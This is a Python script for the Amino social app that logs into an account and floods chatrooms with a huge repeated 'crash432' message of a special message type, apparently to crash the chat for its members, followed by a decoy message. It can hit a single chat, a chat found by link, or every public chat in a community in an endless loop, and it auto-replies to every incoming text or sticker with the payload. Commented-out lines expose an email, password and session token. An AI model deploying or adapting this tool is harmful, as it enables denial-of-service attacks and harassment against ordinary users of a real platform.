# -*-coding: utf-8 -*
import amino
from time import sleep
import time
import sys
from os import system






def clear(): 
    _ = system('clear')

client = amino.Client()
chatroom = '0'
email=sys.argv[1]
password=sys.argv[2]
# email="mececo6731@200cai.com"
# password="idgaf123"
comid='0'
chatmenu=[]
chatname={}
commenu={}
# Mes="crash"*50000

client.login(email,password)
# client.login_sid("AnsiMSI6IG51bGwsICIwIjogMiwgIjMiOiAwLCAiMiI6ICIwNzFmYzQzNS1lNGIxLTQ2MzctYTRmMi1jZmIxYmRiYTQ4MDgiLCAiNSI6IDE2MTI1Nzc0MDUsICI0IjogIjExMC4yMjQuMTkwLjE5NiIsICI2IjogMTAwfe736jenozaVF1AnS-FGL6UmPBK7")
print('\nLogged in \n')

print('\nAvailable Communities')
comlist= client.sub_clients(size=100)
print('\n')
y=0
for name, id in zip(comlist.name,comlist.comId):
    print(y+1 ," : ",name)
    commenu[y]=str(id)
    y+=1

comid=commenu[int(input("\nchoose the community >> "))-1]
subclient = amino.SubClient(comId=comid, profile=client.profile)

clear()
print("\n")

@client.callbacks.event("on_text_message")
def on_text_message(data):
    if data.comId==comid:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=109)
        subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=109)

@client.callbacks.event("on_sticker_message")
def on_sticker_message(data):
    if data.comId==comid:
        message="crash432"*50000
        subclient.send_message(chatId=data.message.chatId,message=message,messageType=109)
        subclient.send_message(chatId=data.message.chatId,message=decoy,messageType=109)
        



chats = subclient.get_public_chat_threads(size=100)
decoy=input('Enter decoy message >> ')
while True:
    clear()
    print('\nAvailable Chatrooms')
    x=0
    for name, id in zip (chats.title, chats.chatId):
        if name!=None:
            print(x+1," : ", name)  
            chatname[x]=str(name)
            chatmenu.append(str(id))
            x+=1
    
    print('\nenter 0 if you want to let loose on the whole community')
    print('\nenter 101 if you want to target via Link of the chatroom')
    menu = int(input("\nchoose the chatroom >> "))-1
    

    if menu == 100:
        m=True
        while m:
            clear()
            link=input("http://aminoapps.com/p/")
            cobj=client.get_from_code(link).objectId
            subclient.join_chat(cobj)
            message="crash432"*50000
            subclient.send_message(chatId=cobj,message=message,messageType=109)
            subclient.send_message(chatId=cobj,message=decoy,messageType=109)
            # tit=subclient.get_chat_thread(cobj).title
            print('\nchat Totalled')
            # subclient.leave_chat(cobj)

    
    if menu == -1:
        clear()
        x=0
        while True:
            for i in chatmenu:
                subclient.join_chat(i)
                message="crash432"*50000
                subclient.send_message(chatId=i,message=message,messageType=109)
                subclient.send_message(chatId=i,message=decoy,messageType=109)
                print('\nchat Totalled', chatname[x])
                # subclient.leave_chat(i)
                x+=1
    chatroom=chatmenu[menu]
    subclient.join_chat(chatroom)
    clear()
    message="crash432"*60000
    subclient.send_message(chatId=chatroom,message=message,messageType=109)
    subclient.send_message(chatId=chatroom,message=decoy,messageType=109)
    print('\nchat Totalled', chatname[menu])
    # subclient.leave_chat(chatroom)
    sleep(2)
    clear()
    




